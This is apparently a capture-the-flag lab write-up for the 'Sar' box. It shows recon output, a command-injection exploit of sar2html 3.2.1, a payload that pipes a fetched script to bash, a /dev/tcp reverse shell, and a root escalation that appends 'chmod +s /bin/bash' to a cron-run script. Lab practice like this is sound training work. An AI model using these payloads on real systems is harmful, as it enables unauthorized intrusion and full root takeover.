-----------------------
# Sar writeups
-----------------------
## Info-sheet
- IP-address: 192.168.188.35
- DNS-Domain name: N/A
- Hostname: Sar
- OS: Linux

## Overview
This is also another easy box, enumerate the web, found sar2html application, the version is leaked and happen to be that this version is vuln to RCE, after gaining initial access, enumerate cronjobs, we found that `/var/www/html/finally.sh` is being run every min on the background as root. the script run another script `/var/www/html/write.sh`, checking the perm of the file, we have write access to it, so we overwrite the script to give SUID perm on `/bin/bash`

-------------
## Recon
-------------

Services and ports:
```bash
# Nmap 7.91 scan initiated Mon Sep  6 13:00:16 2021 as: nmap -v -A -oN scans/nmap.txt -Pn 192.168.188.35  
adjust_timeouts2: packet supposedly had rtt of -183445 microseconds.  Ignoring time.  
adjust_timeouts2: packet supposedly had rtt of -183445 microseconds.  Ignoring time.  
Nmap scan report for 192.168.188.35  
Host is up (0.074s latency).  
Not shown: 998 closed ports  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)  
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)  
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
| http-methods:    
|_  Supported Methods: OPTIONS HEAD GET POST  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Apache2 Ubuntu Default Page: It works  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.91%E=4%D=9/6%OT=22%CT=1%CU=32479%PV=Y%DS=2%DC=T%G=Y%TM=6136493D  
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%II=I%TS=A)SEQ(SP=FC%  
OS:GCD=1%ISR=10C%TI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW  
OS:7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%  
OS:W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1  
OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=  
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%U  
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  
  
Uptime guess: 8.748 days (since Sat Aug 28 19:02:57 2021)  
Network Distance: 2 hops  
TCP Sequence Prediction: Difficulty=252 (Good luck!)  
IP ID Sequence Generation: All zeros  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 443/tcp)  
HOP RTT      ADDRESS  
1   69.54 ms 192.168.49.1  
2   69.66 ms 192.168.188.35  
  
Read data files from: /usr/bin/../share/nmap  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Mon Sep  6 13:00:45 2021 -- 1 IP address (1 host up) scanned in 29.87 seconds
```
### Port 80 - Web server
Server: Apache httpd 2.4.29
Scripting language: php
Domain-name: N/A

- We perform directory busting: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt`
```bash
===============================================================   
Gobuster v3.1.0                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                          
===============================================================                        
[+] Url:                     http://192.168.188.35                                     
[+] Method:                  GET                                                       
[+] Threads:                 10                                                        
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt                      
[+] Negative Status codes:   404                                                       
[+] User Agent:              gobuster/3.1.0                                            
[+] Timeout:                 10s                                                       
===============================================================                        
2021/09/06 13:00:35 Starting gobuster in directory enumeration mode                    
===============================================================                        
/.htpasswd            (Status: 403) [Size: 279]                                        
/.hta                 (Status: 403) [Size: 279]                                        
/.htaccess            (Status: 403) [Size: 279]                                        
/index.html           (Status: 200) [Size: 10918]                                      
/phpinfo.php          (Status: 200) [Size: 95408]                                      
/robots.txt           (Status: 200) [Size: 9]                                          
/server-status        (Status: 403) [Size: 279]                                        
                                                                                      
===============================================================                        
2021/09/06 13:01:09 Finished                 
===============================================================
```

- Found many interesting directory.

\
/robots.txt
- Found possible hidden directory: `sar2HTML`

/sar2HTML
- Showing homepage of `sar2html Ver 3.2.1`
- We do some google, found out that this version of sar2html is vuln to RCE: https://www.exploit-db.com/exploits/47204
```bash
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```
- According to PoC, seem like parameter `plot` in sar2html application, is vuln to OS command injection, which lead to RCE.
- So for PoC, let host a web server, using python3 module: `sudo python3 -m http.server 80`
- Try RCE to get connection back: `?plot=;curl http://$LHOST/rce`
```bash
sudo python3 -m http.server 80  

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
192.168.188.35 - - [06/Sep/2021 13:06:31] "GET /rce HTTP/1.1" 404 -
```
- And we successfully recieve connection back, so we indeed got RCE

-----------
## Exploitation
-----------

### Port 80 - Web server
##### RCE inside sar2html 3.2.1 application
- We will host our bash reverse shell script, get the server to cURL it and pass content to bash
```bash
# rev.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.188/443 0>&1
```

- Host the web server containing our payload and set up listener
- This is our final payload: `?plot=;curl http://$LHOST/rev.sh | bash`
- Trigger it, and we received reverse shell
```bash
sudo python3 -m http.server 80  

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
192.168.188.35 - - [06/Sep/2021 13:06:31] "GET /rev.sh HTTP/1.1" 200 -
```

```bash
sudo nc -lvp 443

listening on [any] 443 ...
192.168.188.35: inverse host lookup failed: Unknown host
connect to [```bash
192.168.49.188
```] from (UNKNOWN) [192.168.188.35] 47406
/bin/sh: 0: can't access tty; job control turned off
$ 
```

- We then stabalize our shell by spawning tty shell using python3 pty module: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sar:/var/www/html/sar2HTML$ 
```

------------------
# Privilege Escalation
------------------

##### Cronjobs
- We read `/etc/crontab`
```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
--> */5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh <--
```
- We found that `/var/www/html/finally.sh` is being run on the background
- Read the script contents
```bash
#!/bin/sh

./write.sh
```
- The script itself run another script, we read `/var/www/html/write.sh` contents
```bash
#!/bin/sh

touch /tmp/gateway
```
- Checking `/var/www/html/write.sh` permission, shown that we owned this file(www-data) and have write permission on this file. So we be able to overwrite the contents of this script and put something else malicious, such as reverse shell
- In this case, we will just overwrite the scripts, to give SUID perm on `/bin/bash`, so we can just get root shell locally
- Run `echo "chmod +s /bin/bash" >> /var/www/html/write.sh`
- We wait for a min, then recheck `/bin/bash` perm: `ls -la /bin/bash`
```bash
-rwsr-sr-x 1 root root 1234376 Feb 24  2021 /bin/bash
```
- Now we be able to get root shell `/bin/bash -p` (you can use [https://gtfobins.github.io/](https://gtfobins.github.io/) as reference)
```bash
www-data@sar:/$ /bin/bash -p
bash-5.1# id
uid=33(www-data) gid=33(www-data) groups=33(www-data) euid=0(root) egid=0(root) groups=0(root)
bash-5.1# whoami
root
bash-5.1#
```

##### rooted!

###### references
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- https://www.exploit-db.com/exploits/47204
- https://www.offensive-security.com/labs/individual/

